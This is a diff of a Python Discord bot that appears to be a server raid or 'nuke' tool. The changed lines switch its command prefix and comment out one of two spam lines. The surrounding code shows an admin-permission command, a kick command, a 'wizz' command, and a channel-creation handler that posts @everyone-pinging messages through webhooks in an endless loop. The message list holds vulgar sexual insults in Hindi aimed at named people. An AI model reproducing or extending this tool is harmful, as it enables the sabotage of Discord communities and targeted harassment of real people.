@@ -4,7 +4,7 @@ import os
 import random 
 from discord import Permissions
 
-client = commands.Bot(command_prefix=">", intents = discord.Intents.all())
+client = commands.Bot(command_prefix="!", intents = discord.Intents.all())
 CHANNEL_NAMES = ["Love from Ankush & Amish(Paracetamol)"]
 MESSAGE_CONTENTS = ["@everyone @here rounak teri maa ke gile bhosde se nikle hue hijde tu or tere srvr ki mai ki chut",
 "@everyone @here nikhil teri amma lwdi h😃 jo khet m mrwane jaati h mumfail ke tel se or teri bndi mere lund pe apni gand ghisti h aake",
@@ -93,7 +93,7 @@ async def admin(ctx):
 
 @client.event
 async def on_ready():
-  await client.change_presence(activity=discord.Game(name= "prefix >"))
+  await client.change_presence(activity=discord.Game(name= "prefix !"))
   print('''Ankush is Ready!''')
 @client.command(pass_context=True)
 async def name(ctx, *, name):
@@ -163,7 +163,7 @@ async def wizz(ctx, amount=50):
 async def on_guild_channel_create(channel):
   webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
   while True:  
-    await channel.send(random.choice(MESSAGE_CONTENTS))
+    #await channel.send(random.choice(MESSAGE_CONTENTS))
     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
 
 @client.command("kick")
